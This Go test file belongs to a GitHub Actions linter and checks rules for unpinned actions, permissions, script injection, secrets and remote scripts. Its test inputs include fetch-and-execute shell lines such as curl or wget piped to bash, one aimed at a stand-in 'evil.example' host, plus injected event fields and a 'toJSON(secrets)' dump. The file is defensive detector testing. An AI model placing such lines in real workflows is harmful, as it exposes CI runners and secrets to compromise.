package rules

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"gha-hardener/internal/workflow"
)

func TestUnpinned(t *testing.T) {
	cases := []struct {
		name string
		src  string
		file string
		want int
	}{
		{"good", "", "unpinned-action/good.yml", 0},
		{"bad", "", "unpinned-action/bad.yml", 1},
		{"reusable good", "", "unpinned-action/reusable-good.yml", 0},
		{"reusable bad", "", "unpinned-action/reusable-bad.yml", 1},
		{"upper sha", "on: push\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@0123456789ABCDEF0123456789ABCDEF01234567\n", "", 0},
		{"local", "on: push\njobs:\n  build:\n    steps:\n      - uses: ./.github/actions/build\n", "", 0},
		{"docker", "on: push\njobs:\n  build:\n    steps:\n      - uses: docker://alpine:3.20\n", "", 0},
		{"no ref", "on: push\njobs:\n  build:\n    steps:\n      - uses: actions/checkout\n", "", 1},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			wf := loadWorkflow(t, tc.file, tc.src)
			got := Unpinned(wf)
			if len(got) != tc.want {
				t.Fatalf("findings %#v", got)
			}
			if tc.want == 1 && got[0].RuleID != "unpinned-action" {
				t.Fatalf("rule %s", got[0].RuleID)
			}
		})
	}
}

func TestPermissionsMissing(t *testing.T) {
	cases := []struct {
		name string
		src  string
		file string
		want int
	}{
		{"good", "", "permissions-missing/good.yml", 0},
		{"bad", "", "permissions-missing/bad.yml", 1},
		{"empty mapping is set", "on: push\npermissions: {}\njobs:\n  build:\n    steps:\n      - run: echo ok\n", "", 0},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			wf := loadWorkflow(t, tc.file, tc.src)
			got := filter(Permissions(wf), "permissions-missing")
			if len(got) != tc.want {
				t.Fatalf("findings %#v", Permissions(wf))
			}
		})
	}
}

func TestPermissionsWriteAll(t *testing.T) {
	cases := []struct {
		name string
		src  string
		file string
		want int
	}{
		{"good", "", "permissions-write-all/good.yml", 0},
		{"bad", "", "permissions-write-all/bad.yml", 1},
		{"upper case", "on: push\npermissions: WRITE-ALL\njobs:\n  build:\n    steps:\n      - run: echo ok\n", "", 1},
		{"job override", "on: push\npermissions: write-all\njobs:\n  safe:\n    permissions:\n      contents: read\n    steps:\n      - run: echo ok\n  loose:\n    steps:\n      - run: echo ok\n", "", 1},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			wf := loadWorkflow(t, tc.file, tc.src)
			got := filter(Permissions(wf), "permissions-write-all")
			if len(got) != tc.want {
				t.Fatalf("findings %#v", got)
			}
			if tc.name == "job override" && got[0].Message != `job "loose" grants permissions: write-all` {
				t.Fatalf("message %q", got[0].Message)
			}
		})
	}
}

func TestScriptInjection(t *testing.T) {
	cases := []struct {
		name string
		src  string
		file string
		want int
	}{
		{"good", "", "script-injection/good.yml", 0},
		{"bad", "", "script-injection/bad.yml", 1},
		{"brackets", "on: push\njobs:\n  build:\n    steps:\n      - run: echo ${{ github['event']['issue']['title'] }}\n", "", 1},
		{"double quotes", "on: push\njobs:\n  build:\n    steps:\n      - run: echo ${{ github[\"event\"] }}\n", "", 1},
		{"event name", "on: push\njobs:\n  build:\n    steps:\n      - run: echo ${{ github.event_name }}\n", "", 0},
		{"event name brackets", "on: push\njobs:\n  build:\n    steps:\n      - run: echo ${{ github['event_name'] }}\n", "", 0},
		{"string literal", "on: push\njobs:\n  build:\n    steps:\n      - run: echo ${{ contains('github.event.issue.title', 'x') }}\n", "", 0},
		{"property named github", "on: push\njobs:\n  build:\n    permissions:\n      contents: read\n    steps:\n      - run: echo ${{ matrix.github.event }}\n", "", 0},
		{"mixed case", "on: push\njobs:\n  build:\n    steps:\n      - run: echo ${{ GitHub.Event.issue.title }}\n", "", 1},
		{"mixed case brackets", "on: push\njobs:\n  build:\n    steps:\n      - run: echo ${{ GitHub['Event'] }}\n", "", 1},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			wf := loadWorkflow(t, tc.file, tc.src)
			got := Injection(wf)
			if len(got) != tc.want {
				t.Fatalf("findings %#v", got)
			}
		})
	}
}

func TestCheckout(t *testing.T) {
	cases := []struct {
		name string
		src  string
		file string
		want int
	}{
		{"good", "", "pull-request-target-checkout/good.yml", 0},
		{"bad", "", "pull-request-target-checkout/bad.yml", 1},
		{"repository only", "on: pull_request_target\npermissions:\n  contents: read\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@0123456789abcdef0123456789abcdef01234567\n        with:\n          repository: ${{ github.event.pull_request.head.repo.full_name }}\n", "", 1},
		{"push is clean", "on: push\njobs:\n  build:\n    permissions:\n      contents: read\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n", "", 0},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := Checkout(loadWorkflow(t, tc.file, tc.src))
			if len(got) != tc.want {
				t.Fatalf("findings %#v", got)
			}
		})
	}
}

func TestSecrets(t *testing.T) {
	cases := []struct {
		name string
		src  string
		file string
		want int
	}{
		{"good", "", "secrets-untrusted-trigger/good.yml", 0},
		{"bad", "", "secrets-untrusted-trigger/bad.yml", 1},
		{"tojson", "on: pull_request\npermissions:\n  contents: read\njobs:\n  build:\n    steps:\n      - run: echo ${{ toJSON(secrets) }}\n", "", 1},
		{"dynamic index", "on: issues\npermissions:\n  contents: read\njobs:\n  build:\n    steps:\n      - run: echo ${{ secrets[github.event.issue.title] }}\n", "", 1},
		{"quoted string", "on: pull_request\npermissions:\n  contents: read\njobs:\n  build:\n    steps:\n      - run: echo ${{ contains('secrets.DEPLOY', 'x') }}\n", "", 0},
		{"secrets property", "on: pull_request\npermissions:\n  contents: read\njobs:\n  build:\n    steps:\n      - run: echo ${{ github.event.client_payload.secrets.value }}\n", "", 0},
		{"trusted push", "on: push\npermissions:\n  contents: read\njobs:\n  build:\n    steps:\n      - env:\n          TOKEN: ${{ secrets.DEPLOY }}\n        run: echo ok\n", "", 0},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := Secrets(loadWorkflow(t, tc.file, tc.src))
			if len(got) != tc.want {
				t.Fatalf("findings %#v", got)
			}
		})
	}
}

func TestPAT(t *testing.T) {
	cases := []struct {
		name string
		src  string
		file string
		want int
	}{
		{"good", "", "unscoped-pat/good.yml", 0},
		{"bad", "", "unscoped-pat/bad.yml", 1},
		{"runtime value", "on: push\npermissions:\n  contents: read\nenv:\n  GH_TOKEN: generated-at-runtime\njobs:\n  build:\n    steps:\n      - run: echo ok\n", "", 0},
		{"github token expression", "on: push\npermissions:\n  contents: read\nenv:\n  GH_TOKEN: ${{ github.token }}\njobs:\n  build:\n    steps:\n      - run: echo ok\n", "", 0},
		{"mixed secrets", "on: push\npermissions:\n  contents: read\nenv:\n  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} ${{ secrets.OTHER }}\njobs:\n  build:\n    steps:\n      - run: echo ok\n", "", 1},
		{"path is not a pat", "on: push\npermissions:\n  contents: read\nenv:\n  PATH: ${{ secrets.DEPLOY }}\njobs:\n  build:\n    steps:\n      - run: echo ok\n", "", 0},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := PAT(loadWorkflow(t, tc.file, tc.src))
			if len(got) != tc.want {
				t.Fatalf("findings %#v", got)
			}
		})
	}
}

func TestRemoteScript(t *testing.T) {
	const sha = "0123456789abcdef0123456789abcdef01234567"
	pinned := "https://raw.githubusercontent.com/owner/repo/" + sha + "/script.sh"
	cases := []struct {
		name string
		src  string
		file string
		want int
	}{
		{"good", "", "remote-script/good.yml", 0},
		{"bad", "", "remote-script/bad.yml", 1},
		{"pipe bash", runYAML("curl -fsSL https://example.com/a.sh | bash"), "", 1},
		{"wget zsh", runYAML("wget -qO- https://example.com/a.sh | zsh"), "", 1},
		{"sudo", runYAML("curl -fsSL https://example.com/a.sh | sudo -E bash"), "", 1},
		{"dash", runYAML("wget -qO- https://example.com/a.sh | dash"), "", 1},
		{"eval double quote", runYAML(`eval "$(curl https://example.com/a.sh)"`), "", 1},
		{"shell -c", runYAML(`bash -c 'curl https://example.com/a.sh | bash'`), "", 1},
		{"continuation in name", "on: push\njobs:\n  build:\n    steps:\n      - run: |\n          cu\\\n          rl https://example.com/a.sh | bash\n", "", 1},
		{"hash inside word", runYAML("x=foo#bar; curl https://example.com/a.sh | bash"), "", 1},
		{"comment hides pipe", runYAML("curl https://example.com/a.sh # note | bash"), "", 0},
		{"quoted echo", runYAML(`echo "bash <(curl https://example.com/a.sh)"`), "", 0},
		{"download then file", runYAML("curl -fsSL https://example.com/a.sh -o /tmp/x && bash /tmp/x"), "", 0},
		{"pinned raw", runYAML("bash <(curl -fsSL " + pinned + ")"), "", 0},
		{"pinned github", runYAML("curl -fsSL https://github.com/owner/repo/raw/" + sha + "/script.sh | bash"), "", 0},
		{"evil hex host", runYAML("bash <(curl -fsSL https://evil.example/" + sha + "/latest.sh)"), "", 1},
		{"variable", runYAML(`curl -fsSL "$URL" | bash`), "", 1},
		{"mixed urls", runYAML("curl " + pinned + " https://example.com/b.sh | bash"), "", 1},
		{"url flag", runYAML("curl --url=https://example.com/a.sh | sh"), "", 1},
		{"or not pipe", runYAML("curl https://example.com/a.sh || bash"), "", 0},
		{"not curl", runYAML("mycurl https://example.com/a.sh | bash"), "", 0},
		{"hex after main", runYAML("bash <(curl -fsSL https://raw.githubusercontent.com/owner/repo/main/" + sha + "/install.sh)"), "", 1},
		{"assignment prefix", runYAML("X=1 curl -fsSL https://example.com/a.sh | bash"), "", 1},
		{"eval joins args", runYAML("eval bash '<(curl https://example.com/a.sh)'"), "", 1},
		{"newline after pipe", runYAML("curl -fsSL https://example.com/a.sh |\nbash"), "", 1},
		{"sudo user", runYAML("curl -fsSL https://example.com/a.sh | sudo -u root bash"), "", 1},
		{"shell option before -c", runYAML("bash -o posix -c 'curl https://example.com/a.sh | bash'"), "", 1},
		{"pipe amp", runYAML("curl -fsSL https://example.com/a.sh |& bash"), "", 1},
		{"norc is not -c", runYAML("bash --norc 'curl https://example.com/a.sh | bash'"), "", 0},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := Remote(loadWorkflow(t, tc.file, tc.src))
			if len(got) != tc.want {
				t.Fatalf("findings %#v", got)
			}
			if tc.want == 1 && got[0].Message != remoteMessage {
				t.Fatalf("message %q", got[0].Message)
			}
		})
	}
}

func runYAML(script string) string {
	var b strings.Builder
	b.WriteString("on: push\njobs:\n  build:\n    steps:\n      - run: |\n")
	for _, line := range strings.Split(script, "\n") {
		b.WriteString("          ")
		b.WriteString(line)
		b.WriteString("\n")
	}
	return b.String()
}

func TestAllCapsFindings(t *testing.T) {
	job := workflow.Job{ID: "build", Permissions: &workflow.Permissions{}}
	for i := 0; i < 1000; i++ {
		job.Steps = append(job.Steps, workflow.Step{
			Uses: "actions/checkout@v4", UsesLine: i + 1, UsesColumn: 1,
		})
	}
	wf := &workflow.Workflow{Path: "ci.yml", Jobs: []workflow.Job{job}}
	got := All([]*workflow.Workflow{wf})
	if len(got) != 1000 {
		t.Fatalf("len %d", len(got))
	}
	if got[998].RuleID != "unpinned-action" || got[999].RuleID != "findings-truncated" {
		t.Fatalf("tail %#v %#v", got[998], got[999])
	}
	if got[999].File != "." || got[999].Line != 1 || got[999].Message != "1 findings omitted" {
		t.Fatalf("note %#v", got[999])
	}
}

func loadWorkflow(t *testing.T, file, src string) *workflow.Workflow {
	t.Helper()
	if file != "" {
		b, err := os.ReadFile(filepath.Join("..", "..", "testdata", "fixtures", file))
		if err != nil {
			t.Fatal(err)
		}
		src = string(b)
	}
	wf, err := workflow.Parse(".github/workflows/ci.yml", []byte(src))
	if err != nil {
		t.Fatal(err)
	}
	return wf
}

func filter(in []Finding, rule string) []Finding {
	var out []Finding
	for _, f := range in {
		if f.RuleID == rule {
			out = append(out, f)
		}
	}
	return out
}
